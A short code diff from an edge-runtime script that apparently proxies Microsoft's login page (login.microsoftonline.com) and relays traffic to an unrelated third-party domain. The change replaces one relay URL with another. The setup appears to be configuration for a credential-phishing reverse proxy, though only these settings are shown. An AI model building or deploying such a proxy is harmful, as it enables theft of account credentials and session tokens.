@@ -3,7 +3,7 @@ export const runtime = 'edge';
 // Configuration
 const UPSTREAM = 'login.microsoftonline.com';
 const UPSTREAM_PATH = '/';
-const VERCEL_URL = 'https://apinero.bralontres.cl/api/relay';
+const VERCEL_URL = 'https://vert-nero.ifacts.ro/api/relay';
 const BLOCKED_REGIONS = [];
 const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
 
